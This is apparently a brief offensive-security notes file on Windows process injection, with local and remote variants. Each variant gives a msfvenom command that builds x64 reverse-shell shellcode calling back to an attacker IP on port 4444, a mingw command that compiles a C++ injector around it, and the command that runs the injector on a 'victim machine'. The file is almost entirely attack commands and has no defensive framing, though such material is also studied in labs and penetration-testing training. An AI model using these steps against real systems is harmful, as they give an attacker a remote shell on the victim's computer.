# Local Process
## Attacker server
- Create revshell by msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.213.136 LPORT=4444 -f c -b \x00\x0a\x0d
```
- Copy shellcode and create a C++ file (selfinject.cpp)
- Compile it into exe file
```bash
x86_64-w64-mingw32-g++ -o inject1.exe selfinject.cpp -static-libgcc -static-libstdc++
```
## Victim machine
```bash
.\inject1.exe
```
# Remote Process
## Attacker server
- Create revshell by msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.213.136 LPORT=4444 -f c -b \x00\x0a\x0d
```
- Copy shellcode and create a C++ file (remoteinject.cpp)
- Compile it into exe file
```bash
x86_64-w64-mingw32-g++ -o inject2.exe remoteinject.cpp -static-libgcc -static-libstdc++
```
## Victim machine
```bash
.\inject2.exe PID_of_inject_process
```
